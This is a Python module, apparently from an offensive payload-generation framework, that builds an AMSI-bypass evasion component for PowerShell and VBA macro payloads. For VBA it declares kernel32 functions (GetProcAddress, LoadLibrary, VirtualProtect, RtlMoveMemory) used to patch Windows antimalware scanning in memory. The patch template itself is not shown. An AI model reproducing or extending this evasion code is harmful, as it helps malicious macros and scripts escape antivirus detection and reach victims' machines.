from core.evasions.Evasion import Evasion
from core.engines.EvasionComponent import EvasionComponent
from core.engines.DefineComponent import DefineComponent
from core.engines.CodeComponent import CodeComponent
from core.controlers.Module import Module


class amsi(Evasion):
    def __init__(self, platform):
        super().__init__(platform)

    def translate(self):
        module = Module()
        module.name = self.__class__.__name__
        code = self.template()
        
        if self.platform == "windows_pwsh":
            module.components = [
                EvasionComponent(code),
            ]
        
        if self.platform == "windows_vba":
            module.components = [
                EvasionComponent("dop"),
                DefineComponent(
                    """Private Declare PtrSafe Function GetProcAddress Lib "kernel32" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function LoadLibrary Lib "kernel32" Alias "LoadLibraryA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long
Private Declare PtrSafe Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As LongPtr)"""),

                CodeComponent(code),
            ]
        
        return module

